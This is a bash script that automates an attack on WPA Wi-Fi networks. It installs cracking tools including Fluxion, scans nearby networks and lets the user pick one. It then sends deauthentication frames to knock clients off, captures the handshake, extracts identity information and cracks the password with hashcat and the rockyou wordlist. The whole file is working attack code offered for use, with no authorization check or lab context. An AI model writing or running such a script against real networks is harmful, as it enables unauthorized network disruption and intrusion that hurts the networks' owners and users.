#!/bin/bash

# === CONFIG ===
IFACE="wlan0"
WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTDIR=~/Desktop/WiFiCrack_$(date +%F_%H-%M-%S)
SCAN_DURATION=20
KILL_SERVICES=true  # Set to false if using separate Wi-Fi adapter

# === TOOL INSTALLATION ===
echo "[*] Installing required tools..."
sudo apt update && sudo apt install -y aircrack-ng hashcat hcxdumptool hcxtools reaver bully mdk4 wifite pixiewps git build-essential cmake libpcap-dev libcurl4-openssl-dev pkg-config

# === FLUXION ===
if [ ! -d /opt/fluxion ]; then
    echo "[*] Installing Fluxion..."
    sudo git clone https://github.com/FluxionNetwork/fluxion /opt/fluxion
    cd /opt/fluxion && sudo ./install/install.sh
    cd -
fi

# === PREP ===
mkdir -p "$OUTDIR"
MON_IFACE="${IFACE}mon"

echo "[*] Enabling monitor mode..."
$KILL_SERVICES && airmon-ng check kill
airmon-ng start "$IFACE" > /dev/null

# === SCAN ===
echo "[*] Scanning for Wi-Fi networks for ${SCAN_DURATION}s..."
timeout "$SCAN_DURATION" airodump-ng --write "$OUTDIR/scan" --output-format csv "$MON_IFACE" > /dev/null 2>&1 &

# Wait for CSV
CSV_FILE=""
for i in {1..10}; do
    CSV_FILE=$(ls "$OUTDIR"/scan-01.csv 2>/dev/null)
    [ -n "$CSV_FILE" ] && break
    sleep 1
done

if [ ! -f "$CSV_FILE" ]; then
    echo "[!] Scan failed. Exiting."
    airmon-ng stop "$MON_IFACE"
    $KILL_SERVICES && sudo systemctl restart NetworkManager
    exit 1
fi

# === PARSE & SELECT ===
echo "[*] Detected networks:"
awk -F',' '/([0-9A-F]{2}:){5}[0-9A-F]{2}/ && $1 !~ /Station/ && NF>14 {
    gsub(/^ +| +$/, "", $1); gsub(/^ +| +$/, "", $14); gsub(/^ +| +$/, "", $4);
    printf("%2d) %-25s | BSSID: %s | CH: %s | Power: %s\n", NR, $14, $1, $4, $5);
}' "$CSV_FILE"

read -p "[?] Select target number: " CHOICE

BSSID=$(awk -F',' '/([0-9A-F]{2}:){5}[0-9A-F]{2}/ && $1 !~ /Station/ && NF>14 { gsub(/^ +| +$/, "", $1); print $1 }' "$CSV_FILE" | sed -n "${CHOICE}p")
CHANNEL=$(awk -F',' '/([0-9A-F]{2}:){5}[0-9A-F]{2}/ && $1 !~ /Station/ && NF>14 { gsub(/^ +| +$/, "", $4); print $4 }' "$CSV_FILE" | sed -n "${CHOICE}p")
SSID=$(awk -F',' '/([0-9A-F]{2}:){5}[0-9A-F]{2}/ && $1 !~ /Station/ && NF>14 { gsub(/^ +| +$/, "", $14); print $14 }' "$CSV_FILE" | sed -n "${CHOICE}p")

echo "[*] Target: $SSID ($BSSID) on channel $CHANNEL"

# === HANDSHAKE CAPTURE ===
gnome-terminal -- bash -c "airodump-ng -c $CHANNEL --bssid $BSSID -w '$OUTDIR/handshake' '$MON_IFACE'" &
sleep 5

echo "[*] Sending deauthentication..."
aireplay-ng --deauth 15 -a "$BSSID" "$MON_IFACE"
sleep 30
pkill airodump-ng

# === CONVERT FOR HASHCAT ===
CAP_FILE=$(ls "$OUTDIR"/handshake*.cap 2>/dev/null | head -n 1)
HC22000_FILE="$OUTDIR/handshake.22000"
CRACKED_FILE="$OUTDIR/cracked.txt"

if [ ! -f "$CAP_FILE" ]; then
    echo "[!] No .cap file found. Exiting."
    airmon-ng stop "$MON_IFACE"
    $KILL_SERVICES && sudo systemctl restart NetworkManager
    exit 1
fi

# === ANALYZE HANDSHAKE ===
echo "[*] Analyzing handshake and extracting information..."
hcxpcapngtool -o "$HC22000_FILE" "$CAP_FILE"  # Convert to Hashcat format
hcxpcapngtool -E "$OUTDIR/essid.txt" -I "$OUTDIR/identity.txt" -P "$OUTDIR/probable.txt" "$CAP_FILE"  # Info extraction

# === CRACK PASSWORD ===
echo "[*] Handshake analysis complete."
echo "[*] Info extracted:"
cat "$OUTDIR/essid.txt"

# Prompt for cracking option
echo "[*] Choose a cracking option:"
echo "[1] Crack password with time limit"
echo "[2] Crack password until complete"
echo "[3] Skip cracking"
read -p "[?] Your choice: " CRACK_OPTION

# Function to start cracking
start_cracking() {
    case $1 in
        1)  # Limit by time
            read -p "[?] Enter the time in seconds (e.g., 600 for 10 minutes): " TIME_LIMIT
            hashcat -m 22000 "$HC22000_FILE" "$WORDLIST" --force --status --runtime=$TIME_LIMIT -o "$CRACKED_FILE"
            ;;
        2)  # Crack until done
            hashcat -m 22000 "$HC22000_FILE" "$WORDLIST" --force --status -o "$CRACKED_FILE"
            ;;
        3)  # Skip cracking
            echo "[*] Skipping cracking."
            ;;
        *)
            echo "[!] Invalid option. Exiting."
            exit 1
            ;;
    esac
}

# Start cracking based on user choice
start_cracking "$CRACK_OPTION"

# === CLEANUP ===
echo "[*] Cleaning up..."
airmon-ng stop "$MON_IFACE"
$KILL_SERVICES && sudo systemctl restart NetworkManager

# === RESULT ===
echo
if [ -s "$CRACKED_FILE" ]; then
    echo "[✓] Password FOUND:"
    cat "$CRACKED_FILE"
else
    echo "[x] No password cracked."
fi

echo "[*] All data saved to: $OUTDIR"

